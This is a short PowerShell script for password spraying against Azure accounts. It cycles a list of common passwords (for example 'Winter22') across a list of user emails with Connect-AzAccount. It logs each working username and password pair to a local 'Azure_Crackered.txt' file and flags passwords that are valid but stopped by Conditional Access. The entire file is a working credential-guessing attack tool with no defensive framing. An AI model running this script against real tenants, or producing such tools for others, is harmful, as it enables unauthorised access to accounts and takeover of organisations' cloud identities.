$passwords = @(
"Winter22"
)
#$passwords = Get-Content c:\temp\pwdList.txt 

$users = @(
"user@mail.com"
)
#$users = Get-Content c:\temp\userList.txt


#$ErrorActionPreference = "SilentlyContinue"
foreach($p in $passwords){
    Write-Host "Starting with" $p "@" (Get-Date) -ForegroundColor Red
    foreach($u in $users){

        #Makes future changes and testing easier 
        $targetUser = $u

        if($targetUser.Length -lt 5){
            Write-Host "Invalid user" $targetUser -ForegroundColor Yellow
        }
        else{
            Clear-Variable creds, check -ErrorAction SilentlyContinue
            $username = $targetUser
            $securePwd = ConvertTo-SecureString -AsPlainText $p -Force
            $creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username,$securePwd
            $check = Connect-AzAccount -Credential $creds -ErrorAction SilentlyContinue -WarningVariable warn
             
            #Did we get data back?
            if($check){
                Write-Host "[+] Success!" -ForegroundColor Green
                Write-Host "User:" $targetUser
                Write-Host "Pwd: " $p 
                Write-Host ""  
                "[+]Found: " + $targetUser + ":" + $p >> c:\temp\Azure_Crackered.txt 
            }
            #Were we blocked by conditional access?
            if($warn -match "Conditional Access"){
                Write-Host "[+] Success! (Conditional)" -ForegroundColor Green
                Write-Host "User:" $targetUser
                Write-Host "Pwd: " $p 
                Write-Host ""  
                "[+]Found (Conditional): " + $targetUser + ":" + $p  + "; Error:" + $warn >> c:\temp\Azure_Crackered.txt
            }
            else{
                Write-Host "[-] Invalid password!" -ForegroundColor Yellow
                Write-Host "User:" $targetUser
                Write-Host "Pwd: " $p
                Write-Host "" 
            }
            Disconnect-AzAccount
        }
    }
}
